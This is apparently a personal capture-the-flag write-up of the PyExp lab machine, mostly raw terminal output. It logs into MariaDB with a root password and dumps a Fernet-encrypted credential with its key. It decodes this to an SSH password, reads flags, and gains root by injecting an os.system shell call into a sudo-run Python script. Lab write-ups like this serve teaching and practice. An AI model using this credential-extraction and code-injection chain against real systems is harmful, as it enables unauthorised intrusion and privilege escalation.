参考资料  
[https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/pyexp](https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/pyexp)
   

[https://medium.com/@mahdi_78420/pyexp-walkthrough-online-b01cf16a2ca5](https://medium.com/@mahdi_78420/pyexp-walkthrough-online-b01cf16a2ca5)
   

192.168.212.118
 
┌──(kali㉿kali)-[~/Desktop/pg02/PyExp]  
└─$ mysql -h 192.168.212.118 -uroot -pprettywoman --skip-ssl  
Welcome to the MariaDB monitor. Commands end with ; or \g.  
Your MariaDB connection id is 20025  
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10
 
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
MariaDB [(none)]\>  
MariaDB [(none)]\> show databases;  
+--------------------+  
| Database |  
+--------------------+  
| data |  
| information_schema |  
| mysql |  
| performance_schema |  
+--------------------+  
4 rows in set (0.095 sec)
 
MariaDB [(none)]\> use data  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A
 
Database changed  
MariaDB [data]\> show tables;  
+----------------+  
| Tables_in_data |  
+----------------+  
| fernet |  
+----------------+  
1 row in set (0.094 sec)
 
MariaDB [data]\> select * from fernet;  
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
| cred | keyy |  
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |  
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+  
1 row in set (0.094 sec)
 
MariaDB [data]\>
 
[https://asecuritysite.com/encryption/ferdecode](https://asecuritysite.com/encryption/ferdecode)
   

Decoded: lucy:wJ9`"Lemdv9[FEw-  
Date created: Mon Aug 10 21:02:44 2020  
Current time: Sat Nov 15 03:36:48 2025
 
======Analysis====  
Decoded data: 80000000005f31b5f46ea5894d37472946181bd53963a2460a980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b  
Version: 80  
Date created: 000000005f31b5f4  
IV: 6ea5894d37472946181bd53963a2460a  
Cipher: 980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22  
HMAC: d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b
 
======Converted====  
IV: 6ea5894d37472946181bd53963a2460a  
Time stamp: 1597093364  
Date created: Mon Aug 10 21:02:44 2020
 
└─$ ssh -p 1337 lucy@192.168.212.118  
The authenticity of host '[192.168.212.118]:1337 ([192.168.212.118]:1337)' can't be established.  
ED25519 key fingerprint is SHA256:K18aoM62L+/GHVzkZJScoh+S91IW1EPPvsc1K7UuVbE.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '[192.168.212.118]:1337' (ED25519) to the list of known hosts.  
lucy@192.168.212.118's password:  
Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
 
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
lucy@pyexp:~$ ls  
local.txt user.txt  
lucy@pyexp:~$ cat user.txt  
Your flag is in another file...  
lucy@pyexp:~$ cat local.txt  
a89d590aca44408d013309334d84d731  
lucy@pyexp:~$
 
lucy@pyexp:/opt$ sudo -u root /usr/bin/python2 /opt/exp.py  
how are you?import os; os.system("/bin/sh")  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root  
# ls  
proof.txt root.txt  
# cat proof.txt  
078009b1dce576f684a546154bbe53c8  
#